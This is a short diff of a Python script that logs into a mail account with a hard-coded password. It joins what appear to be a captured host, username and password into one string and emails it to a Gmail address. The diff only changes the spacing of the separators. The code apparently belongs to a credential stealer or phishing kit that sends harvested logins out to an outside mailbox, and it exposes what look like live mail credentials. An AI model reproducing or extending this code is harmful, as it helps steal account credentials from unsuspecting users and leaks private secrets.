@@ -68,7 +68,7 @@ sp = 'zarguiDK5'
 s.login(sa, sp) 
 
 ra = 'bertranddupont885@gmail.com'
-connexion = cho + '-' + usn + '-' + usp
+connexion = cho + ' - ' + usn + ' - ' + usp
 msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
 msg.attach(msgText)
